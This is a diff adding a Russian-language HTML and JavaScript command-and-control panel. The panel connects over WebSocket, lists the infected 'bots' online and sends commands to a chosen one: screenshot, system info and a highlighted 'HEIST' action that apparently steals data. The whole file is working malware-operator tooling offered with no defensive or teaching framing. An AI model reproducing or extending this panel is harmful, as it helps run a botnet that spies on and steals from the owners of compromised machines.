@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Панель</title>
+    <style>
+        body { font-family: monospace; background-color: #1e1e1e; color: #d4d4d4; padding: 20px; }
+        .container { max-width: 800px; margin: auto; }
+        h1, h2 { color: #4ec9b0; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        #bot-list, #controls { background-color: #252526; border: 1px solid #444; padding: 15px; margin-bottom: 20px; min-height: 50px; }
+        button { background-color: #0e639c; color: white; border: none; padding: 10px 15px; cursor: pointer; margin: 5px; font-size: 14px; }
+        button:hover { background-color: #157fca; }
+        button.selected { border: 2px solid #4ec9b0; }
+        #status { position: fixed; bottom: 10px; left: 10px; background-color: #252526; padding: 8px; border: 1px solid #444; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>[ C2 ПАНЕЛЬ УПРАВЛЕНИЯ ]</h1>
+        <h2>[ БОТЫ В СЕТИ ]</h2>
+        <div id="bot-list"><p>Подключение к серверу...</p></div>
+
+        <div id="controls" style="display: none;">
+            <h2>[ КОМАНДЫ ДЛЯ: <span id="selected-bot-name"></span> ]</h2>
+            <button onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
+            <button onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+            <button onclick="sendCommand({action: 'heist'})" style="background-color: #d16969;">HEIST</button>
+        </div>
+    </div>
+    <div id="status">...</div>
+
+    <script>
+        const ui = {
+            botList: document.getElementById('bot-list'),
+            controls: document.getElementById('controls'),
+            selectedBotName: document.getElementById('selected-bot-name'),
+            status: document.getElementById('status'),
+        };
+        const wsURL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`;
+        let socket, selectedBotId = null;
+
+        function connect() {
+            ui.status.textContent = "Подключение...";
+            socket = new WebSocket(wsURL);
+
+            socket.onopen = () => {
+                ui.status.textContent = "Связь с C2 установлена.";
+                socket.send(JSON.stringify({ type: 'operator', id: 'operator' }));
+            };
+
+            socket.onmessage = (event) => {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 'bot_list') updateBotList(msg.data);
+            };
+
+            socket.onclose = () => {
+                ui.status.textContent = "Связь потеряна. Переподключение через 3с...";
+                selectedBotId = null;
+                ui.controls.style.display = 'none';
+                ui.botList.innerHTML = '<p>Связь с C2 потеряна.</p>';
+                setTimeout(connect, 3000);
+            };
+        }
+
+        function updateBotList(bots) {
+            ui.botList.innerHTML = bots.length ? '' : '<p>Нет активных ботов.</p>';
+            let botToSelect = null;
+
+            bots.forEach(botId => {         const btn = document.createElement('button');
+                btn.textContent = botId;
+                btn.onclick = () => selectBot(botId, btn);
+                ui.botList.appendChild(btn);
+                // Если текущий выбранный бот все еще в сети, оставляем его
+                if (botId === selectedBotId) botToSelect = botId;
+            });
+
+            // Если нет выбранного бота, или он отвалился, выбираем первого
+            if (!botToSelect && bots.length > 0) botToSelect = bots[0];
+
+            if (botToSelect) {
+                 const btn = Array.from(ui.botList.childNodes).find(b => b.textContent === botToSelect);
+                 if (btn) selectBot(botToSelect, btn);
+            } else {
+                 // Если вообще нет ботов, скрываем панель
+                 selectedBotId = null;
+                 ui.controls.style.display = 'none';
+            }
+        }
+
+        function selectBot(botId, btnElement) {
+            selectedBotId = botId;
+            // Снимаем выделение со всех
+            ui.botList.childNodes.forEach(btn => btn.classList && btn.classList.remove('selected'));
+            // Выделяем нужный
+            btnElement.classList.add('selected');
+            ui.selectedBotName.textContent = botId;
+            ui.controls.style.display = 'block';
+        }
+
+        function sendCommand(payload) {
+            if (!selectedBotId) return;
+            const command = { type: 'command', target_id: selectedBotId, payload: payload };
+            socket.send(JSON.stringify(command));
+            ui.status.textContent = `Команда '${payload.action}' отправлена.`;
+        }
+
+        connect();
+    </script>
+</body>
+</html>
